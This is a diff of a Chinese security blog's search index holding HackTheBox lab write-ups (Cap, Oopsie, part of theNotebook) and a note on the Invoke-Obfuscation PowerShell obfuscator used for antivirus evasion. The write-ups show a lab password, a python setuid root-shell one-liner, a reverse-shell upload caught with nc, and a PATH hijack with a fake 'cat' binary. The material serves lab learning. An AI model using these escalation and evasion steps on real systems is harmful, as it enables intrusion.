@@ -1,6 +1,79 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>HACKthebox-Cap</title>
+    <url>/2022/01/07/HackTheBox-Cap/</url>
+    <content><![CDATA[<h1 id="HackTheBox-Cap"><a href="#HackTheBox-Cap" class="headerlink" title="HackTheBox-Cap"></a>HackTheBox-Cap</h1><p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/cap_pwn.png" alt="cap_pwn"></p>
+<span id="more"></span>
+
+<blockquote>
+<p>本机IP：10.10.16.6</p>
+<p>目标IP：10.10.10.245</p>
+</blockquote>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><strong>nmap</strong></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/Cap_nmap.png" alt="nmap"></p>
+<p>开放了21、22、80端口</p>
+<p>常规操作访问一下网站看看干嘛的</p>
+<p>这个网站挺有意思，起到了类似服务器仪表盘的作用，能看本地启动的服务、IP等等</p>
+<p>在<code>Security Snapshot</code>里可以看到流量记录</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/%E6%B5%81%E9%87%8F.png" alt="流量"></p>
+<p>本来下载流量包看了一下全是我自己访问的流量突然就没思路了</p>
+<p>然后切到其他页面看了下功能又切回来以后发现URL有变化，<code>.../data/</code>斜杠后面的数字变了，试试看其他的数字都和上图一样，估计都是我的访问流量，当访问<code>.../data/0</code>的时候不一样了</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/%E6%B5%81%E9%87%8F2.png" alt="流量2"></p>
+<p>下载流量包，用<code>Wireshark</code>分析一下</p>
+<p>找到了nathan用户的用户名密码</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/pcap.png" alt="pcap"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">USER： nathan     PASS Buck3tH4TF0RM3!</span><br></pre></td></tr></table></figure>
+
+<p>上面提到服务器还开放了21、22端口，尝试用刚得到的用户名密码连接</p>
+<p><strong>FTP</strong></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/ftp.png" alt="ftp"></p>
+<p>成功登录，发现了user.txt，下载下来得到user flag</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><strong>SSH</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh james@10.10.10.245</span><br></pre></td></tr></table></figure>
+
+<p>成功连接</p>
+<p>在提权上遇到了问题，首先Linux提权的姿势太多了，以前做的Linux靶机用的大多是<strong>sudo提权滥用</strong>，但是靶机中<code>nathan</code>用户没有使用sudo的权限，所以只能用其他的手段了。</p>
+<p>本台靶机的名字叫cap，google上搜的时候也围绕这个点去找，发现在Linux常用命令里有<code>getcap</code>和<code>setcap</code>，接着发现了一篇很棒的文章（参考链接二），还有一个碉堡了的网站（参考链接三）</p>
+<h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>从2.1版开始,Linux内核有了能力(capability)的概念,即它打破了UNIX/LINUX操作系统中超级用户/普通用户的概念,由普通用户也可以做只有超级用户可以完成的工作.</p>
+<p><strong>Capabilities</strong>的主要思想在于分割root用户的特权，即将root的特权分割成不同的能力，每种能力代表一定的特权操作。例如：能力CAP_SYS_MODULE表示用户能够加载(或卸载)内核模块的特权操作，而<strong>CAP_SETUID表示用户能够修改进程用户身份的特权操作</strong>。在Capbilities中系统将根据进程拥有的能力来进行特权操作的访问控制</p>
+<p>在Capilities中，只有进程和可执行文件才具有能力，每个进程拥有三组能力集，分别称为<code>cap_effective</code>, <code>cap_inheritable</code>, <code>cap_permitted</code>(分别简记为:pE,pI,pP)</p>
+<p><strong>cap_permitted</strong>表示进程所拥有的最大能力集；</p>
+<p><strong>cap_effective</strong>表示进程当前可用的能力集，可以看做是cap_permitted的一个子集；</p>
+<p><strong>cap_inheitable</strong>则表示进程可以传递给其子进程的能力集。</p>
+<p>系统根据进程的cap_effective能力集进行访问控制，cap_effective为cap_permitted的子集，进程可以通过取消cap_effective中的某些能力来放弃进程的一些特权。可执行文件也拥有三组能力集，对应于进程的三组能力集，分别称为cap_effective, cap_allowed 和 cap_forced（分别简记为fE,fI,fP），其中cap_allowed表示程序运行时可从原进程的cap_inheritable中集成的能力集，cap_forced表示运行文件时必须拥有才能完成其服务的能力集；而cap_effective则表示文件开始运行时可以使用的能力。</p>
+<p>各种能力就不一一列举了，参考文章中写的很详细，本台靶机的提权用了<code>CAP_SETUID</code></p>
+<blockquote>
+<p>CAP_SETUID:允许改变进程的用户ID</p>
+</blockquote>
+<p>用<code>getcap</code>命令查看可执行文件获取的内核权限</p>
+<blockquote>
+<p>getcap [-v] [-r] [-h] [-n] <filename> [<filename> …]</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getcap -r / 2&gt;/dev/null  #把错误输出到/dev/null</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/getcap.png" alt="getcap"></p>
+<p>发现 python3.8 有<code>cap_setuid</code>，可以拿来利用提权了，提权方法在<a href="https://gtfobins.github.io/">GTFOBins</a>上找到的</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/gtfobins.png" alt="gtfobins"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -c &#x27;import os;os.setuid(0);os.system(&quot;/bin/sh&quot;)&#x27; #python3.8或者python3都行</span><br></pre></td></tr></table></figure>
+
+
+
+<p>拿到root权限</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/rootflag.png" alt="rootflag"></p>
+<p>得到root flag</p>
+<p>end</p>
+<h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>Linux靶机的提权还是需要更多的学习和积累，虽然本台靶机整个流程很短，也没有什么网站上的漏洞利用直接就连上了，但还是有学到东西的。实际操作得来的经验比起光看博客和书本要印象更加深刻</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://cloud.tencent.com/developer/article/1544037?from=article.detail.1180355">https://cloud.tencent.com/developer/article/1544037?from=article.detail.1180355</a></p>
+<p><a href="https://www.cnblogs.com/sky-heaven/p/12096758.html">https://www.cnblogs.com/sky-heaven/p/12096758.html</a></p>
+<p><a href="https://gtfobins.github.io/gtfobins/python/">https://gtfobins.github.io/gtfobins/python/</a></p>
+]]></content>
+      <tags>
+        <tag>HackTheBox</tag>
+        <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Hackthebox-Armageddon</title>
     <url>/2022/01/07/HackTheBox-Armageddon/</url>
     <content><![CDATA[<h1 id="Hackthebox-Armageddon"><a href="#Hackthebox-Armageddon" class="headerlink" title="Hackthebox-Armageddon"></a>Hackthebox-Armageddon</h1><p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/Armg_pwn.png" alt="pwn"></p>
@@ -118,79 +191,6 @@
       </tags>
   </entry>
   <entry>
-    <title>HACKthebox-Cap</title>
-    <url>/2022/01/07/HackTheBox-Cap/</url>
-    <content><![CDATA[<h1 id="HackTheBox-Cap"><a href="#HackTheBox-Cap" class="headerlink" title="HackTheBox-Cap"></a>HackTheBox-Cap</h1><p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/cap_pwn.png" alt="cap_pwn"></p>
-<span id="more"></span>
-
-<blockquote>
-<p>本机IP：10.10.16.6</p>
-<p>目标IP：10.10.10.245</p>
-</blockquote>
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><strong>nmap</strong></p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/Cap_nmap.png" alt="nmap"></p>
-<p>开放了21、22、80端口</p>
-<p>常规操作访问一下网站看看干嘛的</p>
-<p>这个网站挺有意思，起到了类似服务器仪表盘的作用，能看本地启动的服务、IP等等</p>
-<p>在<code>Security Snapshot</code>里可以看到流量记录</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/%E6%B5%81%E9%87%8F.png" alt="流量"></p>
-<p>本来下载流量包看了一下全是我自己访问的流量突然就没思路了</p>
-<p>然后切到其他页面看了下功能又切回来以后发现URL有变化，<code>.../data/</code>斜杠后面的数字变了，试试看其他的数字都和上图一样，估计都是我的访问流量，当访问<code>.../data/0</code>的时候不一样了</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/%E6%B5%81%E9%87%8F2.png" alt="流量2"></p>
-<p>下载流量包，用<code>Wireshark</code>分析一下</p>
-<p>找到了nathan用户的用户名密码</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/pcap.png" alt="pcap"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">USER： nathan     PASS Buck3tH4TF0RM3!</span><br></pre></td></tr></table></figure>
-
-<p>上面提到服务器还开放了21、22端口，尝试用刚得到的用户名密码连接</p>
-<p><strong>FTP</strong></p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/ftp.png" alt="ftp"></p>
-<p>成功登录，发现了user.txt，下载下来得到user flag</p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><strong>SSH</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh james@10.10.10.245</span><br></pre></td></tr></table></figure>
-
-<p>成功连接</p>
-<p>在提权上遇到了问题，首先Linux提权的姿势太多了，以前做的Linux靶机用的大多是<strong>sudo提权滥用</strong>，但是靶机中<code>nathan</code>用户没有使用sudo的权限，所以只能用其他的手段了。</p>
-<p>本台靶机的名字叫cap，google上搜的时候也围绕这个点去找，发现在Linux常用命令里有<code>getcap</code>和<code>setcap</code>，接着发现了一篇很棒的文章（参考链接二），还有一个碉堡了的网站（参考链接三）</p>
-<h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>从2.1版开始,Linux内核有了能力(capability)的概念,即它打破了UNIX/LINUX操作系统中超级用户/普通用户的概念,由普通用户也可以做只有超级用户可以完成的工作.</p>
-<p><strong>Capabilities</strong>的主要思想在于分割root用户的特权，即将root的特权分割成不同的能力，每种能力代表一定的特权操作。例如：能力CAP_SYS_MODULE表示用户能够加载(或卸载)内核模块的特权操作，而<strong>CAP_SETUID表示用户能够修改进程用户身份的特权操作</strong>。在Capbilities中系统将根据进程拥有的能力来进行特权操作的访问控制</p>
-<p>在Capilities中，只有进程和可执行文件才具有能力，每个进程拥有三组能力集，分别称为<code>cap_effective</code>, <code>cap_inheritable</code>, <code>cap_permitted</code>(分别简记为:pE,pI,pP)</p>
-<p><strong>cap_permitted</strong>表示进程所拥有的最大能力集；</p>
-<p><strong>cap_effective</strong>表示进程当前可用的能力集，可以看做是cap_permitted的一个子集；</p>
-<p><strong>cap_inheitable</strong>则表示进程可以传递给其子进程的能力集。</p>
-<p>系统根据进程的cap_effective能力集进行访问控制，cap_effective为cap_permitted的子集，进程可以通过取消cap_effective中的某些能力来放弃进程的一些特权。可执行文件也拥有三组能力集，对应于进程的三组能力集，分别称为cap_effective, cap_allowed 和 cap_forced（分别简记为fE,fI,fP），其中cap_allowed表示程序运行时可从原进程的cap_inheritable中集成的能力集，cap_forced表示运行文件时必须拥有才能完成其服务的能力集；而cap_effective则表示文件开始运行时可以使用的能力。</p>
-<p>各种能力就不一一列举了，参考文章中写的很详细，本台靶机的提权用了<code>CAP_SETUID</code></p>
-<blockquote>
-<p>CAP_SETUID:允许改变进程的用户ID</p>
-</blockquote>
-<p>用<code>getcap</code>命令查看可执行文件获取的内核权限</p>
-<blockquote>
-<p>getcap [-v] [-r] [-h] [-n] <filename> [<filename> …]</p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getcap -r / 2&gt;/dev/null  #把错误输出到/dev/null</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/getcap.png" alt="getcap"></p>
-<p>发现 python3.8 有<code>cap_setuid</code>，可以拿来利用提权了，提权方法在<a href="https://gtfobins.github.io/">GTFOBins</a>上找到的</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/gtfobins.png" alt="gtfobins"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -c &#x27;import os;os.setuid(0);os.system(&quot;/bin/sh&quot;)&#x27; #python3.8或者python3都行</span><br></pre></td></tr></table></figure>
-
-
-
-<p>拿到root权限</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/rootflag.png" alt="rootflag"></p>
-<p>得到root flag</p>
-<p>end</p>
-<h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>Linux靶机的提权还是需要更多的学习和积累，虽然本台靶机整个流程很短，也没有什么网站上的漏洞利用直接就连上了，但还是有学到东西的。实际操作得来的经验比起光看博客和书本要印象更加深刻</p>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://cloud.tencent.com/developer/article/1544037?from=article.detail.1180355">https://cloud.tencent.com/developer/article/1544037?from=article.detail.1180355</a></p>
-<p><a href="https://www.cnblogs.com/sky-heaven/p/12096758.html">https://www.cnblogs.com/sky-heaven/p/12096758.html</a></p>
-<p><a href="https://gtfobins.github.io/gtfobins/python/">https://gtfobins.github.io/gtfobins/python/</a></p>
-]]></content>
-      <tags>
-        <tag>HackTheBox</tag>
-        <tag>渗透测试</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>HackTheBox-Dynstr</title>
     <url>/2022/01/07/HackTheBox-Dynstr/</url>
     <content><![CDATA[<h1 id="HackTheBox-Dynstr"><a href="#HackTheBox-Dynstr" class="headerlink" title="HackTheBox-Dynstr"></a>HackTheBox-Dynstr</h1><p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/dynstr_pwn.png" alt="pwn"></p>
@@ -211,7 +211,7 @@
 <p>dnsalias.htb</p>
 <p>dynamicdns.htb</p>
 <p>no-ip.htb</p>
-<p>dyna.htb(由网页底部<a href="mailto:&#x64;&#110;&#115;&#x40;&#x64;&#121;&#x6e;&#x61;&#x2e;&#x68;&#x74;&#x62;">&#x64;&#110;&#115;&#x40;&#x64;&#121;&#x6e;&#x61;&#x2e;&#x68;&#x74;&#x62;</a>获得)</p>
+<p>dyna.htb(由网页底部<a href="mailto:&#x64;&#110;&#115;&#64;&#x64;&#121;&#110;&#97;&#x2e;&#104;&#x74;&#x62;">&#x64;&#110;&#115;&#64;&#x64;&#121;&#110;&#97;&#x2e;&#104;&#x74;&#x62;</a>获得)</p>
 </blockquote>
 <p>Beta中说网站正在测试模式下运行，并提供了共享凭据：</p>
 <blockquote>
@@ -449,249 +449,6 @@
       </tags>
   </entry>
   <entry>
-    <title>HackTheBox-Oopsie</title>
-    <url>/2022/01/07/HackTheBox-Oopsie/</url>
-    <content><![CDATA[<h1 id="Hackthebox-Oopsie"><a href="#Hackthebox-Oopsie" class="headerlink" title="Hackthebox-Oopsie"></a>Hackthebox-Oopsie</h1><span id="more"></span>
-
-<blockquote>
-<p>目标IP：10.10.10.28</p>
-<p>本机IP：10.10.16.38</p>
-</blockquote>
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a><strong>nmap</strong></h3><p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/nmap-Oopsie.png" alt="nmap-Oopsie"></p>
-<p>通过nmap信息搜集可以发现目标开放了22和80端口，既然开放了WEB服务，直接访问看看网站的功能和可能存在问题的点。</p>
-<p>网站按钮全部无效，页面底部有邮箱 <code>admin@megacorp.com</code>可能有用。</p>
-<p>其中有处内容存在提示</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/tips-Oopsite.png" alt="tips-Oopsite"></p>
-<p>翻译过来为：<code>我们提供服务来操作生产数据，如报价、客户请求等。请登录以获取服务。</code></p>
-<h3 id="Burpsuite"><a href="#Burpsuite" class="headerlink" title="Burpsuite"></a><strong>Burpsuite</strong></h3><p>通过<code>Burpsuite</code>截包，我们在网站地图中找到了可能的登录路径</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/login-Oopsite.png" alt="login-Oopsite"></p>
-<p>直接访问<code>http://10.10.10.28/cdn-cgi/login/</code>进入登录界面</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/backlogin-Oopsite.png" alt="backlogin-Oopsite"></p>
-<p>尝试登录，用户名<code>admin</code>或者<code>administrator</code></p>
-<p>密码弱口令爆破无果，看了下官方WP，密码为上一台靶机Archetype的管理员密码<code>MEGACORP_4dm1n!!</code>，登录成功。</p>
-<h2 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h2><p>简单看了一下功能，其中<code>Uploads</code>页面提示需要超级管理员权限。</p>
-<p>那么接下来就是如何获取超级管理员权限看能否进行文件上传。</p>
-<p>其中<code>Account</code>页面可以看到当前用户信息</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/account-Oopsite.png" alt="account-Oopsite"></p>
-<p>再看Burpsuite中当前页面的请求包</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/request-Oopsite.png" alt="request-Oopsite"></p>
-<p><code>GET</code>参数<code>content</code>用来进行功能页面的跳转，<code>id</code>参数作用不明</p>
-<p><code>Cookie</code>中<code>user</code>、<code>role</code>分别对应<code>Access ID</code>、<code>Name</code></p>
-<p>两个方向猜测：1.是否存在sql注入 2.是否存在越权漏洞</p>
-<p>经过简单的测试发现sql注入行不通，尝试对<code>id</code>进行爆破。Payload可以用<code>Intruder</code>模块自带的<code>numbers</code></p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/superadmin-Oopsite.png" alt="superadmin-Oopsite"></p>
-<p>结果中看到有几个id请求的响应包长度不同，其中<code>id=30</code>的响应包中发现了<code>super admin</code></p>
-<p>字样，对应的<code>Access ID</code>为<code>86575</code>，直接在URL中修改<code>id=30</code>访问<code>Account</code>页面发现确实是超级管理员账号。</p>
-<p>回到<code>Uploads</code>页面抓包，修改<code>Cookie</code>中的<code>user</code>值为<code>86575</code>发回数据包，可以上传文件了</p>
-<h2 id="文件上传反弹shell"><a href="#文件上传反弹shell" class="headerlink" title="文件上传反弹shell"></a>文件上传反弹shell</h2><p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/uploads-Oopsite.png" alt="uploads-Oopsite"></p>
-<p>文件上传shell文件（注意抓包修改user值为超级管理员），文件上传成功但是不知道上传目录，用目录扫描工具扫一下试试</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/uploadshell-Oopsite.png" alt="uploadshell-Oopsite"></p>
-<p>发现uploads路径，nc监听2333端口，curl请求test.php反弹shell</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 2333 //shell中写的1234端口</span><br><span class="line">curl http://10.10.10.28/uploads/test.php</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/shell-Oopsite.png" alt="shell-Oopsite"></p>
-<p>查看各种目录文件，在<code>/var/www/html/cdn-cgi/login</code>中发现了<code>db.php</code>文件</p>
-<p>获取内容得到本地用户<code>robert</code>的账号密码</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/dbphp-Oopsite.png" alt="dbphp-Oopsite"></p>
-<p>尝试用<code>su xxxx</code>切换用户，报错：<code>su: must be run from a terminal</code></p>
-<p>反弹的shell是个<code>非交互式shell</code>，非交互式shell会有很多问题，比如：</p>
-<ul>
-<li>无法用vim等文本编辑器</li>
-<li>不能用tab补全指令</li>
-<li>不能su</li>
-<li>不能向上使用历史</li>
-<li>…</li>
-</ul>
-<h3 id="知识点-交互式和非交互式"><a href="#知识点-交互式和非交互式" class="headerlink" title="知识点 交互式和非交互式"></a>知识点 交互式和非交互式</h3><p><strong>交互式模式</strong>：就是在终端上执行，shell等待你的输入，并且立即执行你提交的命令。这种模式被称作交互式是因为shell与用户进行交互。这种模式也是大多数用户非常熟悉的：登录、执行一些命令、退出。当你退出后，shell也终止了。</p>
-<p><strong>非交互式模式</strong>：以shell script(非交互)方式执行。在这种模式 下，shell不与你进行交互，而是读取存放在文件中的命令,并且执行它们。当它读到文件的结尾EOF，shell也就终止了。</p>
-<p>网上反弹shell升级交互式用的都是python，但是目标机子上没有python环境，然后去问了树哥，树哥说用<code>script /dev/null</code>,惊了居然su可行了！！</p>
-<p>但是这个shell不是交互式的shell，算是个半交互式，不如交互式方便但也凑合</p>
-<h3 id="知识点-script命令-和-dev-null"><a href="#知识点-script命令-和-dev-null" class="headerlink" title="知识点 script命令 和 /dev/null"></a>知识点 script命令 和 /dev/null</h3><p><strong>script命令</strong></p>
-<p>scirpt就是一个命令，可以制作一份记录输出到终端的记录</p>
-<p><strong>/dev/null</strong></p>
-<p><code>/dev/null</code>代表linux的空设备文件，所有往这个文件里面写入的内容都会丢失，俗称“黑洞”</p>
-<p>用途</p>
-<p>1.丢弃标准输出</p>
-<p>2.丢弃标准错误输出</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/nullpython-Oopsite.png" alt="nullpython-Oopsite"></p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/userflag-Oopsite.png" alt="userflag-Oopsite"></p>
-<p>得到user的flag</p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>利用<a href="https://www.runoob.com/linux/linux-comm-id.html">Linux id命令</a>发现robert所在组为bugtracker</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/id-Oopsite.png" alt="id-Oopsite"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -type f -g bugtracker 2&gt;/dev/null #Linuxfind命令 -type 设置查找类型为文件 -g 设置组为bugtracker 2&gt;/dev/null 将错误输出到/dev/null 2为Linux文件描述符（错误输出）</span><br><span class="line">ls -al /usr/bin/bugtracker Linux ls基本命令参数不多赘述</span><br></pre></td></tr></table></figure>
-
-<p>其中有个<a href="https://www.cnblogs.com/qlqwjy/p/8665871.html">s权限</a>，当一个可执行程序具有SetUID权限，用户执行这个程序时，将以这个程序所有者的身份执行。前提是这个文件是可执行文件，可就是具有x权限(属组必须先设置相应的x权限)</p>
-<p>执行<code>/usr/bin/bugtracker</code></p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/bug1-Oopsite.png" alt="bug1-Oopsite"></p>
-<p>文件作用是 用户输入一个<code>BUG ID</code>输出BUG报告</p>
-<p>用<a href="https://blog.csdn.net/stpeace/article/details/46641069">strings命令</a>查看<code>/usr/bin/bugtracker</code>的执行过程</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/bug2-Oopsite.png" alt="bug2-Oopsite"></p>
-<p>如箭头所指，文件执行过程中调用了<code>cat</code>命令输出<code>/root/reports/</code>目录下的BUG报告</p>
-<p>由于s权限，robert用户本来无权读取<code>/root/reports/</code>，现在可以了</p>
-<p>我们可以构造一个恶意的cat命令来提权root</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export PATH=/tmp:$PATH //设置环境变量到/tmp linux下的tmp目录是一个系统产生临时文件的存放目录，同时每个用户都可以对他进行读写操作</span><br><span class="line">cd /tmp/ //切换到/tmp目录下</span><br><span class="line">echo &#x27;/bin/sh&#x27; &gt; cat </span><br><span class="line">chmod +x cat //赋予执行权限</span><br></pre></td></tr></table></figure>
-
-<p>此时，再次执行<code>/usr/bin/bugtracker</code>将会调用<code>/tmp</code>目录下的恶意cat命令，此时我们再次输入任意<code>BUG ID</code>就可以用root权限执行命令了</p>
-<p><strong>注意没有变成root用户</strong></p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/root-Oopsite.png" alt="root-Oopsite"></p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/rootflag-Oopsite.png" alt="rootflag-Oopsite"></p>
-<p>得到root的flag</p>
-<p>end</p>
-<p><strong>小结</strong></p>
-<p>总的看下来这台靶机其实不算特别难，终究是自己的知识面太狭隘</p>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/gui951753/article/details/79154496">https://blog.csdn.net/gui951753/article/details/79154496</a></p>
-<p><a href="https://www.cnblogs.com/aaak/p/14067593.html">https://www.cnblogs.com/aaak/p/14067593.html</a></p>
-<p><a href="https://www.linuxprobe.com/shell-dev-null.html">https://www.linuxprobe.com/shell-dev-null.html</a></p>
-]]></content>
-      <tags>
-        <tag>HackTheBox</tag>
-        <tag>渗透测试</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Invoke-Obfuscation工具小记</title>
-    <url>/2022/02/22/Invoke-Obfuscation%E5%B7%A5%E5%85%B7%E5%B0%8F%E8%AE%B0/</url>
-    <content><![CDATA[<h1 id="Powershell命令和脚本混淆器Invoke-Obfuscation"><a href="#Powershell命令和脚本混淆器Invoke-Obfuscation" class="headerlink" title="Powershell命令和脚本混淆器Invoke-Obfuscation"></a>Powershell命令和脚本混淆器Invoke-Obfuscation</h1><p>下载地址：<a href="https://github.com/danielbohannon/Invoke-Obfuscation">https://github.com/danielbohannon/Invoke-Obfuscation</a></p>
-<span id="more"></span>
-
-<h2 id="安装报错解决"><a href="#安装报错解决" class="headerlink" title="安装报错解决"></a>安装报错解决</h2><p>在安装该框架的时候碰到了点问题，基本上报的错误是下面这个</p>
-<blockquote>
-<p>Import-Module.\Invoke-Obfuscation.psd1 : 无法将“Import-Module.\Invoke-Obfuscation.psd1”项识别为 cmdlet、函数、脚本文 件或可运行程序的名称。请检查名称的拼写，如果包括路径，请确保路径正确，然后再试一次</p>
-</blockquote>
-<p><strong>解决方法</strong></p>
-<p>直接用管理员身份运行Powershell (实测从管理员身份的cmd转powshell没用)</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set-ExecutionPolicy Unrestricted</span><br><span class="line">Import-Module ./Invoke-Obfuscation.psd1</span><br><span class="line">Invoke-Obfuscation</span><br></pre></td></tr></table></figure>
-
-<p>问题解决</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20211109154703264.png" alt="image-20211109154703264"></p>
-<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><blockquote>
-<p>1、设置要混淆的ps1文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set scriptpath 路径     //直接加ps1文件路径 例如：E:\...\payload.ps1</span><br><span class="line">或</span><br><span class="line">set scriptblock &quot;xxx&quot;     //xxx为powershell命令</span><br></pre></td></tr></table></figure>
-
-<p>2、加密</p>
-<p>encoding选择加密方式</p>
-<p>3、输出文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">out [路径\文件名]   //例如：E:\\...\1.ps1</span><br></pre></td></tr></table></figure>
-
-<p>*4、选择命令的启动方式</p>
-<p>加密后back返回上级</p>
-<p>launcher选择命令的启动方式</p>
-</blockquote>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>1、<a href="https://www.cnblogs.com/mrhonest/p/13425804.html">https://www.cnblogs.com/mrhonest/p/13425804.html</a></p>
-<p>2、<a href="https://zhuanlan.zhihu.com/p/377121742%EF%BC%88%E5%A5%BD%E6%96%87%EF%BC%81%EF%BC%81%EF%BC%81%EF%BC%89">https://zhuanlan.zhihu.com/p/377121742（好文！！！）</a></p>
-]]></content>
-      <tags>
-        <tag>渗透测试</tag>
-        <tag>免杀</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>HackTheBox-theNotebook</title>
-    <url>/2022/01/07/HackTheBox-theNotebook/</url>
-    <content><![CDATA[<h1 id="Hackthebox-theNotebook"><a href="#Hackthebox-theNotebook" class="headerlink" title="Hackthebox-theNotebook"></a>Hackthebox-theNotebook</h1><p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_pwned.png" alt="pwned"></p>
-<span id="more"></span>
-
-<blockquote>
-<p>本机IP：10.10.16.11</p>
-<p>目标IP：10.10.10.230</p>
-</blockquote>
-<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>1.jwt令牌伪造</p>
-<p>2.CVE-2019-5736 docker容器逃逸</p>
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><strong>nmap</strong></p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_nmap.png" alt="nmap"></p>
-<p>还是熟悉的22和80端口，访问下网站</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/notebook.png" alt="notebook"></p>
-<p>测试了一下，登录和注册界面应该不存在sql注入</p>
-<p>尝试注册admin发现用户已经存在了</p>
